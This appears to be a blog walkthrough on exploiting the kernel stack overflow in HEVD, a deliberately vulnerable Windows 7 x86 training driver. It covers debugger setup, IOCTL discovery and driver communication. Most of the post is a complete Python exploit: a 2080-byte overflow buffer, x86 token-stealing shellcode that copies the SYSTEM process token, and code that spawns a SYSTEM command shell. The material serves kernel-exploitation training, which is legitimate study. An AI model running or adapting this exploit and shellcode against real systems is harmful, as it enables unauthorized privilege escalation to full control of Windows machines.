---
layout: single
title: HEVD - Windows 7 x86 Kernel Stack Overflow
---

Walkthrough for the HEVD Windows Kernel Driver exploitation, exploiting a Stack-based vulnerability.

----

HEVD (HackSys Extreme Vulnerable Driver) is the Vulnserver of Kernel Land, it's a Windows kernel driver that is prone to various types of vulnerabilities, everything from basic Stack-overflows and UAF vulnerabilities, to Pool-overflows. HEVD is the de-facto standard for anyone who is looking to pursue the Offsec OSEE certification or for any security/vulnerability researcher who wants to learn kernel exploitation and kernel debugging. 

- [https://github.com/hacksysteam/HackSysExtremeVulnerableDriver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)

*A strong User-mode exploitation history is recommended before continuing with kernel exploit development*

----

**Setting up our kernel debugging environment**

For Windows kernel debugging you will need to set up two separate virtual machines and establish one as the host and one as the victim, you will bind them together with a virtual Serial port, instead of stopping and debugging a single program, this will allow for managing and debugging the entire victim VM (as if it were an application).

1. Set up a Windows 7 x86 VM
2. Clone the VM -> and name the clone as the victim VM which will run HEVD
3. Set up the virtual Serial port, boot up the host VM in normal mode
4. Boot up the victim VM (debugging mode on startup)

A full tutorial on this can be found [online](https://medium.com/@eaugusto/setting-up-a-windows-7-virtualbox-vm-for-kernel-mode-debugging-367911889316) and one Google search away.

![KD debugging enviroment](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/debugKDenv.png)

----

**Driver analysis & IOCTL discovery**

A full blog post on the detailed specifics about utilizing IOCTLs for Windows kernel exploitation can be found [here](https://fullshade.github.io/windows/internals/2020/02/01/IOCTL-kernel-drivers.html), once you dive into the world of Windows kernel I/O, it gets very complicated, so the *what is an IOCTL* gets its own post.

But just to recap, an IOCTL is a system call code that allows for the communication from a user-mode application to a kernel-mode driver. To establish a communication session with the Kernel-mode HEVD device driver, we need to locate an IOCTL.

We can use the same technique and method as mentioned in the above blog post link. We can use IDA Pro and the `win_driver_plugin` IDA plugin to automate our IOCTL discovery (Automation will not always work and can easily generate false positives.) Static code analysis for the IOCTL discovery is also possible within the HEVD driver.


1. Load and install the IDA Pro plugin into the plugin folder
2. Edit > IOCTL > Find Dispatch (CTRL+ALT+S)
3. Right Click > Driver Plugin > Decode all IOCTLs in function

![ioctl auto](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/IDA-ioctls-plugin.png)

The `0x222003h` IOCTL code is what we can use for communication. This can also be discovered manually by viewing the `DriverEntry` function > to the `IrpDeviceIoCtlHandler` function which shows us the IOCTL code. Also, since HEVD is open-source, you can view the IOCTL definition macro in its source code and calculate each IOCTL with that.

----

**Communicating with the driver**

Since this exploit will be implementing in Python, we will be using the ctypes library, which allows for Windows Win32 API function using via utilizing the various DLL's that the functions are apart of. If your exploit is in C/C++ you just need to include the <windows.h> library to use the API function directly as the MSDN documentation gives.

We can use the [CreateFileA](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) function to establish a handler to the kernel-mode driver. CreateFileA is denoted by Microsofts MSDN docs as a function that allows for handler distribution from kernel-mode to allow for cross communications.

```python
    kernel32      	  = windll.kernel32

    lpFileName            = "\\\\.\HackSysExtremeVulnerableDriver" # --> Device driver
    dwDesiredAccess       = 0xC0000000 # --> (Generic_Read (0x80000000) + Generic_Write (0x40000000))
    dwShareMode           = 0
    SecurityAttributes    = None
    dwCreationDisposition = 0x3        # --> (Open_Existing)
    dwFlagsAndAttributes  = 0
    hTemplateFile         = None

    device_handle = kernel32.CreateFileA( 
    	lpFileName,
	dwDesiredAccess,
	dwShareMode,
	SecurityAttributes,
	dwCreationDisposition,
	dwFlagsAndAttributes,
	hTemplateFile
    )
```

After obtaining a handler to the driver and opening up the initial communication pathway, we can use the [DeviceIoControl](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol) function to pass data through the handler and to the driver.

```python
    hDevice			= device_handle	  # --> The handler provided by CreateFileA
    dwIoControlCode		= 0x222003	  # --> (IOCTL code)
    lpInBuffer			= id_payload      # --> ID of our payload (token stealing shellcode)
    nInBufferSize		= bufSize         # --> buffer size of out payload
    lpOutBuffer			= None
    nOutBufferSize		= 0
    lpBytesReturned		= byref(c_ulong())
    pOverlapped			= None

    kernel32.DeviceIoControl(
    	hDevice,		# --> HANDLE
    	dwIoControlCode,	# --> DWORD
    	lpInBuffer,		# --> LPVOID
    	nInBufferSize,		# --> DWORD
    	lpOutBuffer,		# --> LPVOID
    	nOutBufferSize,		# --> DWORD
    	lpBytesReturned,	# --> LPDWORD
    	pOverlapped		# --> LPOVERLAPPED
    )
```


**Token stealing shellcode payload**

The payload being utilized is a token stealing shellcode payload, once the attacker has code execution in kernel-mode, they can provide this shellcode to steal a System level payload.

```assembly
token_stealing_shellcode = (
    "\x60"                            ; Save registers state
    "\x64\x8b\x80\x24\x01\x00\x00"    ; Get nt!_KPCR.PcrbData.CurrentThread
				      ; _KTHREAD is located at FS:[0x124]
    "\x8b\x40\x50"                    ; Get nt!_KTHREAD.ApcState.Process
    "\x89\xc1"                        ; Copy current process _EPROCESS structure
    "\xba\x04\x00\x00\x00"            ; WIN 7 SP1 SYSTEM process PID = 0x4
    "\x8b\x80\xb8\x00\x00\x00"        ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
    "\x2d\xb8\x00\x00\x00"            

    "\x39\x90\xb4\x00\x00\x00"        ; Get nt!_EPROCESS.UniqueProcessId
    "\x75\xed"                        

    "\x8b\x90\xf8\x00\x00\x00"        ; Get SYSTEM process nt!_EPROCESS.Token
    "\x89\x91\xf8\x00\x00\x00"        ; Get current process token
    "\x61"                            
```

```
    "\x31\xC0"                        # NTSTATUS -> STATUS_SUCCESS
    "\x5D"                            # pop ebp
    "\xC2\x08\x00"                    # ret 8
)
```

```python
    shellcode_address = id(token_stealing_shellcode) + 20
    print("[+] Shellcode payloads address: %s" %shellcode_address)
    print("[+] Stealing NT Authority\System token...")
    return shellcode_address
```
Returning the id of our payload is required as a parameter for the `DeviceIoControl` function used above.

```python
import sys, os, subprocess, ctypes, struct
from ctypes import *
#from win32com.shell import shell

def trigger_stack_overflow():

    kernel32      	  = windll.kernel32

    lpFileName            = "\\\\.\HackSysExtremeVulnerableDriver"
    dwDesiredAccess       = 0xC0000000 # --> (Generic_Read (0x80000000) + Generic_Write (0x40000000))
    dwShareMode           = 0
    SecurityAttributes    = None
    dwCreationDisposition = 0x3        # --> (Open_Existing)
    dwFlagsAndAttributes  = 0
    hTemplateFile         = None

    device_handle = kernel32.CreateFileA( 
    	lpFileName,
	dwDesiredAccess,
	dwShareMode,
	SecurityAttributes,
	dwCreationDisposition,
	dwFlagsAndAttributes,
	hTemplateFile
    )

    if not device_handle or device_handle == -1:
        print("[!] Error creating Device handle: %s" %lpFileName)
        sys.exit()
    else:
    	print("[+] Device handler setup successful")
        print("[+] Device handle in use: %s" %lpFileName)

    print("[+] Preparing the Ring0 Payload...")
    # constructing the exploit payload

    stack_overflow_exploit  = "\x41" * 2080
    stack_overflow_exploit += struct.pack("<L",shellcode_payload())

    id_payload = id(stack_overflow_exploit) + 20
    bufSize = len(stack_overflow_exploit)
    print("[+] Malicious payload size: %s" %bufSize)

    hDevice			= device_handle	
    dwIoControlCode		= 0x222003		# --> (HackSys_EVD_StackOverflow)
    lpInBuffer			= id_payload
    nInBufferSize		= bufSize
    lpOutBuffer			= None
    nOutBufferSize		= 0
    lpBytesReturned		= byref(c_ulong())
    pOverlapped			= None

    kernel32.DeviceIoControl(
    	hDevice,		# --> HANDLE
    	dwIoControlCode,	# --> DWORD
    	lpInBuffer,		# --> LPVOID
    	nInBufferSize,		# --> DWORD
    	lpOutBuffer,		# --> LPVOID
    	nOutBufferSize,		# --> DWORD
    	lpBytesReturned,	# --> LPDWORD
    	pOverlapped		# --> LPOVERLAPPED
    )

    IOCTL_Name = "0x222003"
    print("[+] IOCTL in use: %s" %IOCTL_Name)
	
    """
    new_process = subprocess.Popen("start cmd", shell=True)
    print("[+] Elevated CMD prompt PID: %s" %new_process.pid)
    print("\n[+] Enjoy your NT Authority\System shell")
    """
    #-- Without using the win32com module you can still pop a shell, just comment out the admin check

    if shell.IsUserAnAdmin():
        new_process = subprocess.Popen("start cmd", shell=True)
    	print("[+] Elevated CMD prompt PID: %s" %new_process.pid)
    	print("\n[+] Enjoy your NT Authority\System shell")
    else:
        print("[!] Error running the exploit")

def shellcode_payload():
    token_stealing_shellcode = (
        "\x60"                            # pushad
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]
        "\x89\xc1"                        # mov ecx,eax
        "\xba\x04\x00\x00\x00"            # mov edx,0x4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
        "\x75\xed"                        # jnz 0x1a
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
        "\x61"                            # popad
        "\x31\xC0"                        # NTSTATUS -> STATUS_SUCCESS
        "\x5D"                            # pop ebp
        "\xC2\x08\x00"                    # ret 8
    )

    shellcode_address = id(token_stealing_shellcode) + 20
    print("[+] Shellcode payloads address: %s" %shellcode_address)
    print("[+] Stealing NT Authority\System token...")
    return shellcode_address

if __name__ == '__main__':
    print("\n[+] HEVD stack-based overflow exploit\n")
    print("[+] Starting exploit...")
    trigger_stack_overflow()
```

**Getting NT Authority \ SYSTEM**

![cmd shell as system](https://raw.githubusercontent.com/x00pwn/Windows-Kernel-Exploitation-HEVD/master/images/HEVD_stack-overflow.png)

## Conclusion

Conclusively, in this post we covered the basic exploitation of a standard stack-based buffer overflow that resides in a third-party kernel driver. Utilizing some basic input output functions that allows us to communicate and send data to the driver, we had the ability to send data that crashed the application, and then we utilize a token stealing shellcode payload, that traversed the EPROCESS data structure to obtain a system level access token, while using that stolen token to spawn a new system level shell.
